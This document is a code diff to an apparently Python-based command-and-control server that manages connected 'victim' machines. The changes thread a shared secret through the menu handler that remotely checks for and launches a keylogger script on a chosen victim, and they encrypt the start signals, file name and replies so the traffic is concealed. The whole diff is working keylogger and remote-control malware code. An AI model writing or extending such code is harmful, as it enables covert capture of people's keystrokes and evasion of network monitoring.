@@ -9,7 +9,7 @@ import time
 from scapy.layers.inet import IP, TCP, UDP, ICMP
 from scapy.layers.inet6 import IPv6
 from scapy.sendrecv import send, sniff
-from commander_cryptography import encrypt_file, decrypt
+from commander_cryptography import encrypt_file, decrypt, encrypt_string, decrypt_string
 import constants
 import ipaddress
 from ipv6_getter import determine_ipv6_address
@@ -213,7 +213,7 @@ def disconnect_from_client(sockets_list: list, connected_clients: dict):
             target_ip = str(ipaddress.ip_address(input(constants.ENTER_TARGET_IP_DISCONNECT_PROMPT)))
             target_port = int(input(constants.ENTER_TARGET_PORT_DISCONNECT_PROMPT))
 
-            # CHECK: if client is present in connected_clients list
+            # CHECK: If client is present in connected_clients list
             for client_sock, client_info in connected_clients.items():
                 if client_info[:2] == (target_ip, target_port):
                     target_socket = client_sock
@@ -4196,7 +4196,7 @@ def perform_menu_item_3(client_dict: dict):
     print(constants.MENU_CLOSING_BANNER)
 
 
-def perform_menu_item_1(client_dict: dict):
+def perform_menu_item_1(client_dict: dict, shared_secret: bytes):
     print(constants.START_KEYLOG_INITIAL_MSG)
 
     # a) CASE: Check if client list is empty
@@ -4219,7 +4219,7 @@ def perform_menu_item_1(client_dict: dict):
             print(constants.MENU_CLOSING_BANNER)
             return None
         else:
-            __perform_menu_item_1_helper(client_socket, client_dict, ip, port, status_2)
+            __perform_menu_item_1_helper(client_socket, client_dict, ip, port, status_2, shared_secret)
 
     # c) CASE: Handle any specific connected client in client list
     elif len(client_dict) != constants.ZERO:
@@ -4238,7 +4238,7 @@ def perform_menu_item_1(client_dict: dict):
                 print(constants.MENU_CLOSING_BANNER)
                 return None
             else:
-                __perform_menu_item_1_helper(target_socket, client_dict, target_ip, target_port, status_2)
+                __perform_menu_item_1_helper(target_socket, client_dict, target_ip, target_port, status_2, shared_secret)
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
             print(constants.RETURN_MAIN_MENU_MSG)
@@ -4249,38 +4249,39 @@ def perform_menu_item_1(client_dict: dict):
 
 
 def __perform_menu_item_1_helper(client_socket: socket.socket, client_dict: dict,
-                                 ip: str, port: int, is_watching: bool):
-    # Send signal to start keylog
+                                 ip: str, port: int, is_watching: bool, shared_secret: bytes):
     print(constants.START_SEND_SIGNAL_MSG.format(constants.KEYLOG_FILE_NAME, ip, port))
-    client_socket.send(constants.START_KEYLOG_MSG.encode())
+
+    # Send encrypted signal to start keylog
+    client_socket.send(encrypt_string(constants.START_KEYLOG_MSG, shared_secret).encode())
 
     # Await OK signal from client
     print(constants.AWAIT_START_RESPONSE_MSG)
-    ack = client_socket.recv(constants.BYTE_LIMIT).decode()
+    ack = decrypt_string(client_socket.recv(constants.BYTE_LIMIT).decode(), shared_secret)
 
     #  i) Check if keylogger.py is in victim's directory
     try:
         if ack == constants.RECEIVED_CONFIRMATION_MSG:
             print(constants.START_SIGNAL_RECEIVED_MSG.format(constants.KEYLOG_FILE_NAME))
-            client_socket.send(constants.CHECK_KEYLOG.encode())
+            client_socket.send(encrypt_string(constants.CHECK_KEYLOG, shared_secret).encode())
 
             print(constants.START_SIGNAL_SEND_FILE_NAME.format(constants.KEYLOG_FILE_NAME))
-            client_socket.send(constants.KEYLOG_FILE_NAME.encode())
+            client_socket.send(encrypt_string(constants.KEYLOG_FILE_NAME, shared_secret).encode())
 
             # Get status
             print(constants.AWAIT_START_RESPONSE_MSG)
-            status = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
-            msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+            status = decrypt_string(client_socket.recv(constants.BYTE_LIMIT).decode(), shared_secret)
+            msg = decrypt_string(client_socket.recv(constants.BYTE_LIMIT).decode(), shared_secret)
 
             if status == constants.STATUS_TRUE:
                 print(constants.CLIENT_RESPONSE.format(msg))
 
                 # Send signal to victim to start
                 print(constants.START_SIGNAL_EXECUTE_KEYLOG.format(constants.KEYLOG_FILE_NAME))
-                client_socket.send(constants.START_KEYLOG_MSG.encode())
+                client_socket.send(encrypt_string(constants.START_KEYLOG_MSG, shared_secret).encode())
 
                 # Awaiting Response
-                msg = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+                msg = decrypt_string(client_socket.recv(constants.MIN_BUFFER_SIZE).decode(), shared_secret)
                 print(constants.CLIENT_RESPONSE.format(msg))
 
                 # Replace the keylog status of the client in client dictionary to True
